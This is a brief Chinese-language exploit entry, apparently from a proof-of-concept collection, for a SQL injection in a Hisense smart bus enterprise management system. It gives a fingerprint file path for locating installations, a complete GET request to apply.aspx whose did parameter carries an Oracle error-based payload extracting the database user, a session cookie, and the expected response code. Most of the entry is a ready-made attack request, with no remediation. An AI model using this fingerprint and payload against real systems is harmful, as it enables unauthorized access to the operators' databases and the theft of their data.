# Hisense-海信公交智能公交企业管理系统apply存在Sql注入漏洞

- **系统**：Hisense　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"`
- **请求**：`GET /YZSoft/Forms/XForm/OA/apply.aspx?tid=-1&did=-1%27%20and%20(select%20dbms_xdb_version.checkin((select%20user%20from%20dual))%20from%20dual)is%20not%20null-- HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=5lmeeox2qglphs51xs2k5ze1`
- **预期**：200　|　—